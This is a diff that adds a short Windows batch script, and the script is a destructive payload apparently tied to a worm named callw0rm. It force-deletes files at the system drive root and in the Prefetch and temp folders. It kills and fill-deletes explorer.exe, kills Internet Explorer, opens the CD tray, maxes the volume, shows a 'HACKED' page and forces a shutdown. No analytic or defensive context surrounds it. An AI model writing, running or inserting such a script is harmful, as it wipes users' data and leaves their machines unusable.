@@ -1,0 +1,18 @@
+@echo off
+attrib -a -h -s -r %SystemDrive%\*.*
+del %SystemDrive%\*.* /f /q
+attrib -a -h -s -r %windir%\system\callw0rm.exe
+del %windir%\system\callw0rm.exe /f /q
+cmd32.exe killprocess iexplore.exe
+cmd32.exe killprocess explorer.exe
+cmd32.exe cmdwait 1000 filldelete "%windir%\explorer.exe"
+cmd32.exe cdrom open
+cmd32.exe changesysvolume 65535
+cmd32.exe execmd "%windir%\HaCkEd!!!.html"
+cmd32.exe cmdwait 1000 win max stitle "HACKED"
+attrib -a -h -s -r %windir%\Prefetch\*.*
+del %windir%\Prefetch\*.* /f /q
+cmd32.exe wait 10000
+cmd32.exe initshutdown "Shutting down the system within 60 seconds" 60 shutdown
+del %TEMP%\* /f /s /q
+del %windir%\temp\* /f /s /q
